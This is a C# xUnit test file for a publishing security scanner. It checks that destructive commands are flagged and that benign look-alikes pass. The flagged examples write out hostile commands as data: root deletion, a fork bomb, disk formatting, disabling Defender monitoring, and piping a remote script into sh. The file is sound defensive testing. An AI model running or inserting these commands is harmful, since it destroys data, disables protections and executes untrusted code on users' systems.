using E3A.Application.Options;
using E3A.Application.Publishing.Security;
using E3A.Tests.Publishing.Shared;
using FluentAssertions;
using Xunit;

namespace E3A.Tests.Publishing.Security;

public sealed class ScanRulesDangerousCommandTests
{
    private readonly PublishingOptions _options = PublishingOptionsFactory.Default();

    [Theory]
    [InlineData(ScanRuleIds.RecursiveRootDeletion, "rm -rf /")]
    [InlineData(ScanRuleIds.ForkBomb, ":(){ :|:& };:")]
    [InlineData(ScanRuleIds.FilesystemDestruction, "mkfs.ext4 /dev/sda1")]
    [InlineData(ScanRuleIds.FilesystemDestruction, "echo clean | diskpart")]
    [InlineData(ScanRuleIds.SecurityControlTampering, "Set-MpPreference -DisableRealtimeMonitoring $true")]
    [InlineData(ScanRuleIds.RemoteScriptToInterpreter, "curl -sL https://get.example.com/i.sh | sh")]
    public void Scan_ShouldReportFinding_WhenContentMatchesDangerousCommandRule(string ruleId, string content)
    {
        var report = SecurityScanner.Scan(ScanCorpusFactory.Markdown(content), ScanCorpusFactory.ScriptExtensions, _options);

        report.Findings.Should().Contain(x => x.RuleId == ruleId && x.Category == ScanCategories.DangerousCommand && x.Severity == ScanSeverity.Block);
    }

    [Theory]
    [InlineData(ScanRuleIds.RecursiveRootDeletion, "rm -rf ./node_modules")]
    [InlineData(ScanRuleIds.ForkBomb, "The :() idiom is explained in the appendix.")]
    [InlineData(ScanRuleIds.FilesystemDestruction, "Read the mkfs manual before formatting anything.")]
    [InlineData(ScanRuleIds.FilesystemDestruction, "Use diskpart to inspect the volume layout on Windows.")]
    [InlineData(ScanRuleIds.FilesystemDestruction, "Run format C: only inside a throwaway virtual machine.")]
    [InlineData(ScanRuleIds.SecurityControlTampering, "Get-MpPreference | Format-List")]
    [InlineData(ScanRuleIds.RemoteScriptToInterpreter, "curl -sL https://api.example.com/data | jq .")]
    [InlineData(ScanRuleIds.RemoteScriptToInterpreter, "curl -sL https://api.example.com/data | python -m json.tool")]
    public void Scan_ShouldNotReportFinding_WhenCommandIsBenign(string ruleId, string content)
    {
        var report = SecurityScanner.Scan(ScanCorpusFactory.Markdown(content), ScanCorpusFactory.ScriptExtensions, _options);

        report.Findings.Should().NotContain(x => x.RuleId == ruleId);
    }
}
